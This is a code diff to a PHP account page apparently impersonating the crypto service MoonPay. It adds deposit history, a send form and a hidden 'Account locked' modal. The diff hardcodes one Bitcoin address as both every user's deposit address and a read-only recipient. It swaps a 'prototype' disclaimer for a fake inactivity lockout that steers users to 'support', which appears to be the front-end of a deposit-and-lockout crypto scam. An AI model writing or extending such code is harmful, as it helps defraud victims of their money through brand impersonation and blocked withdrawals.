@@ -1,6 +1,7 @@
 <?php
 require_once __DIR__.'/../src/bootstrap.php';
 $user=require_auth();
+$pdo=Database::connection();
 
 $action=trim((string)($_GET['action']??''));
 $labels=[
@@ -14,6 +15,19 @@ $labels=[
 $title=$labels[$action]??'Account action';
 $restricted=($user['status']??'active')!=='active';
 $walletAddress='bc1q4pj3qpjnjvt7h7y475jff5fgu2n2twl5575mnv';
+
+$depositHistory=[];
+if(($action==='deposit' || $action==='receive') && !$restricted){
+    $historyStmt=$pdo->prepare(
+        "SELECT description,amount,currency,status,created_at
+         FROM transactions
+         WHERE user_id=:id AND type='deposit'
+         ORDER BY created_at DESC
+         LIMIT 8"
+    );
+    $historyStmt->execute(['id'=>$user['id']]);
+    $depositHistory=$historyStmt->fetchAll();
+}
 ?>
 <!doctype html>
 <html lang="en">
@@ -28,6 +42,7 @@ $walletAddress='bc1q4pj3qpjnjvt7h7y475jff5fgu2n2twl5575mnv';
   <a class="brand" href="/dashboard.php"><span class="brand-mark">M</span><span>moonpay</span></a>
   <nav><a href="/dashboard.php">Overview</a><a href="/help.php">Help</a><?php if(($user['role']??'')==='admin'):?><a href="/admin.php">Admin</a><?php endif;?><a href="/logout.php">Log out</a></nav>
 </header>
+
 <main class="shell action-shell">
   <?php if($restricted): ?>
     <section class="action-restricted">
@@ -41,6 +56,7 @@ $walletAddress='bc1q4pj3qpjnjvt7h7y475jff5fgu2n2twl5575mnv';
       </div>
       <a class="button button-dark" href="/help.php">Get help</a>
     </section>
+
   <?php elseif($action==='deposit' || $action==='receive'): ?>
     <section class="action-panel">
       <p class="eyebrow">Receive crypto</p>
@@ -65,19 +81,82 @@ $walletAddress='bc1q4pj3qpjnjvt7h7y475jff5fgu2n2twl5575mnv';
       <p class="action-note">Check the network and address carefully before sending assets.</p>
       <a class="button button-light" href="/dashboard.php">Back to overview</a>
     </section>
+
+    <section class="panel deposit-history-panel">
+      <div class="panel-head">
+        <h2>Deposit history</h2>
+        <span>Latest deposits</span>
+      </div>
+      <?php if($depositHistory): ?>
+        <?php foreach($depositHistory as $x): ?>
+          <div class="transaction-row">
+            <div>
+              <strong><?=e($x['description'])?></strong>
+              <small><?=e(ucfirst($x['status']))?> · <?=e(date('M j, Y · g:i A',strtotime($x['created_at'])))?></small>
+            </div>
+            <strong class="positive">+<?=e($x['currency'])?> <?=number_format((float)$x['amount'],2)?></strong>
+          </div>
+        <?php endforeach; ?>
+      <?php else: ?>
+        <div class="deposit-history-empty">
+          <strong>No deposits yet</strong>
+          <p class="muted">Completed and pending deposits will appear here.</p>
+        </div>
+      <?php endif; ?>
+    </section>
+
   <?php elseif($action==='send'): ?>
     <section class="action-panel">
       <p class="eyebrow">Send crypto</p>
       <h1>Send</h1>
-      <p class="muted">Enter the recipient wallet address to continue.</p>
+      <p class="muted">Enter the recipient wallet address and amount to continue.</p>
 
-      <label class="wallet-field">
-        <span>Recipient wallet address</span>
-        <input type="text" value="<?=e($walletAddress)?>" aria-label="Recipient wallet address" readonly>
-      </label>
-      <p class="action-note">This prototype does not submit or broadcast a blockchain transaction.</p>
-      <a class="button button-dark" href="/dashboard.php">Back to overview</a>
+      <form class="send-form" id="send-form">
+        <label class="wallet-field">
+          <span>Recipient wallet address</span>
+          <input type="text" name="address" value="<?=e($walletAddress)?>" aria-label="Recipient wallet address" readonly>
+        </label>
+
+        <label class="wallet-field">
+          <span>Amount</span>
+          <div class="amount-input">
+            <input type="number" name="amount" min="0" step="0.00000001" placeholder="0.00" required>
+            <span>BTC</span>
+          </div>
+        </label>
+
+        <button class="button button-dark send-button" type="submit">Send BTC</button>
+        <p class="action-note">You will review the transfer before it can be submitted.</p>
+      </form>
+
+      <a class="button button-light" href="/dashboard.php">Back to overview</a>
     </section>
+
+    <div class="onboarding-backdrop send-lock-backdrop" id="send-lock-modal" role="dialog" aria-modal="true" aria-labelledby="send-lock-title" hidden>
+      <section class="onboarding-modal send-lock-modal">
+        <div class="onboarding-top">
+          <span class="onboarding-brand"><span class="brand-mark">M</span> moonpay</span>
+          <span>Account security</span>
+        </div>
+        <div class="onboarding-track">
+          <article class="onboarding-slide is-active">
+            <div class="onboarding-icon">!</div>
+            <p class="eyebrow">Transfer unavailable</p>
+            <h2 id="send-lock-title">Account locked</h2>
+            <p>Your account is currently restricted due to inactivity. Sending crypto is unavailable until your account is reviewed and reactivated.</p>
+            <div class="action-restricted-copy">
+              <strong>Activate account to resume functions</strong>
+              <span>Contact support to request an account review and reactivation.</span>
+            </div>
+          </article>
+        </div>
+        <div class="onboarding-actions">
+          <a class="button button-dark" href="/help.php">Request account review</a>
+          <button class="onboarding-skip" type="button" id="close-send-lock">Go back</button>
+        </div>
+      </section>
+    </div>
+
   <?php else: ?>
     <section class="action-panel">
       <p class="eyebrow">Account action</p>
